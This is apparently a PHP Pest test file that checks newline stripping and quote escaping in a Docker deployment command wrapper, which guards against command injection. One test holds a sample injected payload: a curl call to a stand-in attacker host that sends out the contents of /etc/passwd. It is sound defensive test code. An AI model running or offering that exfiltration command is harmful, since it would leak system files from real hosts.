<?php

use Tests\TestCase;

uses(TestCase::class);

it('strips newlines from pre_deployment_command before building sh -c wrapper', function () {
    $exec = buildDeploymentExecCommand("echo hello\necho injected");

    expect($exec)->not->toContain("\n")
        ->and($exec)->not->toContain("\r")
        ->and($exec)->toContain('echo hello echo injected')
        ->and($exec)->toMatch("/^docker exec .+ sh -c '.+'$/");
});

it('strips carriage returns from deployment command', function () {
    $exec = buildDeploymentExecCommand("echo hello\r\necho injected");

    expect($exec)->not->toContain("\r")
        ->and($exec)->not->toContain("\n")
        ->and($exec)->toContain('echo hello echo injected');
});

it('strips bare carriage returns from deployment command', function () {
    $exec = buildDeploymentExecCommand("echo hello\recho injected");

    expect($exec)->not->toContain("\r")
        ->and($exec)->toContain('echo hello echo injected');
});

it('leaves single-line deployment command unchanged', function () {
    $exec = buildDeploymentExecCommand('php artisan migrate --force');

    expect($exec)->toContain("sh -c 'php artisan migrate --force'");
});

it('prevents newline injection with malicious payload', function () {
    // Attacker tries to inject a second command via newline in heredoc transport
    $exec = buildDeploymentExecCommand("harmless\ncurl http://evil.com/exfil?\$(cat /etc/passwd)");

    expect($exec)->not->toContain("\n")
        // The entire command should be on a single line inside sh -c
        ->and($exec)->toContain('harmless curl http://evil.com/exfil');
});

it('handles multiple consecutive newlines', function () {
    $exec = buildDeploymentExecCommand("cmd1\n\n\ncmd2");

    expect($exec)->not->toContain("\n")
        ->and($exec)->toContain('cmd1   cmd2');
});

it('properly escapes single quotes after newline normalization', function () {
    $exec = buildDeploymentExecCommand("echo 'hello'\necho 'world'");

    expect($exec)->not->toContain("\n")
        ->and($exec)->toContain("echo '\\''hello'\\''")
        ->and($exec)->toContain("echo '\\''world'\\''");
});

/**
 * Replicates the exact command-building logic from ApplicationDeploymentJob's
 * run_pre_deployment_command() and run_post_deployment_command() methods.
 *
 * This tests the security-critical str_replace + sh -c wrapping in isolation.
 */
function buildDeploymentExecCommand(string $command, string $containerName = 'my-app-abcdef123'): string
{
    // This mirrors the exact logic in run_pre_deployment_command / run_post_deployment_command
    $normalized = str_replace(["\r\n", "\r", "\n"], ' ', $command);
    $cmd = "sh -c '".str_replace("'", "'\''", $normalized)."'";

    return "docker exec {$containerName} {$cmd}";
}
